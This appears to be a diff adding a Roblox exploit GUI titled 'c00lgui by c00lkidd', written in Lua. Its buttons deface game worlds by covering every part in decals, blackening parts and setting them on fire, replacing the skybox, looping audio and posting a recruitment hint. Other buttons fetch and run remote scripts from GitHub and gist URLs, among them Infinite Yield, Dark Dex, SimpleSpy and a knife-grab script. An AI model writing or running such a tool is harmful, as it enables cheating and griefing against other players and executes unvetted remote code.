@@ -1,0 +1,226 @@
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local SoundService = game:GetService("SoundService")
+local StarterGui = game:GetService("StarterGui")
+
+local function applySkybox()
+    local sky = Instance.new("Sky", Lighting)
+    local id = "rbxassetid://158118263"
+    sky.SkyboxBk = id
+    sky.SkyboxDn = id
+    sky.SkyboxFt = id
+    sky.SkyboxLf = id
+    sky.SkyboxRt = id
+    sky.SkyboxUp = id
+end
+
+local function decalSpam()
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("UnionOperation") or obj:IsA("Terrain") then
+            for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
+                local decal = Instance.new("Decal")
+                decal.Texture = "rbxassetid://158118263"
+                decal.Face = face
+                decal.Parent = obj
+            end
+        end
+    end
+end
+
+local function activate666()
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("UnionOperation") then
+            obj.Color = Color3.fromRGB(0, 0, 0)
+            obj.Material = Enum.Material.SmoothPlastic
+            obj.Reflectance = 0
+            obj.Transparency = 0
+            local fire = Instance.new("Fire")
+            fire.Size = 10
+            fire.Heat = 5
+            fire.Color = Color3.fromRGB(255, 0, 0)
+            fire.SecondaryColor = Color3.fromRGB(255, 0, 0)
+            fire.Parent = obj
+        end
+    end
+end
+
+local function playSound()
+    local music = Instance.new("Sound", SoundService)
+    music.SoundId = "rbxassetid://95156028272944"
+    music.Looped = true
+    music.Volume = 1
+    music.Pitch = 0.2
+    music:Play()
+end
+
+local function showHint()
+    local hint = Instance.new("Hint", workspace)
+    hint.Text = "Team c00lkidd! Join today!"
+end
+
+local function particleEffect()
+    for _, player in pairs(Players:GetPlayers()) do
+        local function addParticles(character)
+            local rootPart = character:WaitForChild("HumanoidRootPart", 5) or character:FindFirstChild("Torso")
+            if rootPart then
+                local attachment = Instance.new("Attachment", rootPart)
+                local particle = Instance.new("ParticleEmitter", attachment)
+                particle.Texture = "rbxassetid://158118263"
+                particle.Rate = 25
+                particle.Lifetime = NumberRange.new(2)
+                particle.Speed = NumberRange.new(1, 2)
+                particle.Size = NumberSequence.new(2)
+                particle.LightEmission = 1
+                particle.Transparency = NumberSequence.new(0)
+                particle.SpreadAngle = Vector2.new(360, 360)
+                particle.VelocitySpread = 180
+            end
+        end
+
+        if player.Character then
+            addParticles(player.Character)
+        end
+
+        player.CharacterAdded:Connect(addParticles)
+    end
+end
+
+local function notifyScript(name, success)
+    local imageId = "rbxassetid://158118263"
+    local message = success and "Have fun!" or "Script didn't load"
+    StarterGui:SetCore("SendNotification", {
+        Title = name,
+        Text = message,
+        Icon = imageId,
+        Duration = 5
+    })
+end
+
+local function loadScript(url, name, useAsync)
+    local success = pcall(function()
+        if useAsync then
+            loadstring(game:HttpGetAsync(url))()
+        else
+            loadstring(game:HttpGet(url))()
+        end
+    end)
+    notifyScript(name, success)
+end
+
+local function loadInfiniteYield()
+    loadScript("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", "Infinite Yield")
+end
+
+local function loadDex()
+    loadScript("https://gist.githubusercontent.com/dannythehacker/1781582ab545302f2b34afc4ec53e811/raw/ee5324771f017073fc30e640323ac2a9b3bfc550/dark%2520dex%2520v4", "Dark Dex")
+end
+
+local function loadRemoteSpy()
+    loadScript("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpyBeta.lua", "RemoteSpy", true)
+end
+
+local actions = {
+    applySkybox,
+    decalSpam,
+    activate666,
+    playSound,
+    showHint,
+    particleEffect,
+    loadInfiniteYield,
+    loadDex,
+    loadRemoteSpy
+}
+
+local labels = {
+    "Skybox",
+    "Decal Spam",
+    "666",
+    "Play Sound",
+    "Hint",
+    "Particles",
+    "Infinite Yield",
+    "Dark Dex",
+    "RemoteSpy"
+}
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+
+ScreenGui.Name = "GridUI"
+ScreenGui.Parent = game:GetService("CoreGui")
+
+local buttonWidth = 120
+local buttonHeight = 70
+local spacingX = 30
+local spacingY = 20
+local rows = 3
+local cols = 3
+local titleHeight = 40
+local topPadding = 10
+local bottomPadding = 10
+
+local totalWidth = buttonWidth * cols + spacingX * (cols - 1)
+local totalHeight = titleHeight + topPadding + bottomPadding + rows * buttonHeight + (rows - 1) * spacingY
+
+Frame.Name = "MainFrame"
+Frame.Size = UDim2.new(0, totalWidth + 40, 0, totalHeight)
+Frame.Position = UDim2.new(0.5, -(totalWidth + 40) / 2, 0.5, -totalHeight / 2)
+Frame.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+
+Title.Size = UDim2.new(0, totalWidth + 40, 0, titleHeight)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 24
+Title.Text = "c00lgui by c00lkidd"
+Title.Parent = Frame
+
+local backgroundImage = Instance.new("ImageLabel")
+backgroundImage.Image = "rbxassetid://158118263"
+backgroundImage.Size = UDim2.new(0, 300, 0, 300)
+backgroundImage.Position = UDim2.new(0, -120, 0.5, -150)
+backgroundImage.BackgroundTransparency = 1
+backgroundImage.Rotation = -25
+backgroundImage.ZIndex = 0
+backgroundImage.Parent = Frame
+
+local startX = (Frame.Size.X.Offset - totalWidth) / 2
+local startY = titleHeight + topPadding
+
+for i = 0, 8 do
+    local row = math.floor(i / cols)
+    local col = i % cols
+    local Button = Instance.new("TextButton")
+    Button.Size = UDim2.new(0, buttonWidth, 0, buttonHeight)
+    Button.Position = UDim2.new(0, startX + col * (buttonWidth + spacingX), 0, startY + row * (buttonHeight + spacingY))
+    Button.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+    Button.BorderSizePixel = 0
+    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Button.Font = Enum.Font.SourceSansBold
+    Button.TextSize = 20
+    Button.Text = labels[i + 1]
+    Button.ZIndex = 1
+    Button.Parent = Frame
+    Button.MouseButton1Click:Connect(actions[i + 1])
+end
+
+local GrabKnifeButton = Instance.new("TextButton")
+GrabKnifeButton.Size = UDim2.new(0, 120, 0, 30)
+GrabKnifeButton.Position = UDim2.new(1, -130, 0, 5)
+GrabKnifeButton.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
+GrabKnifeButton.BorderSizePixel = 0
+GrabKnifeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+GrabKnifeButton.Font = Enum.Font.SourceSansBold
+GrabKnifeButton.TextSize = 18
+GrabKnifeButton.Text = "Grab Knife"
+GrabKnifeButton.ZIndex = 2
+GrabKnifeButton.Parent = Frame
+GrabKnifeButton.MouseButton1Click:Connect(function()
+    loadScript("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V4.txt", "Grab Knife")
+end)
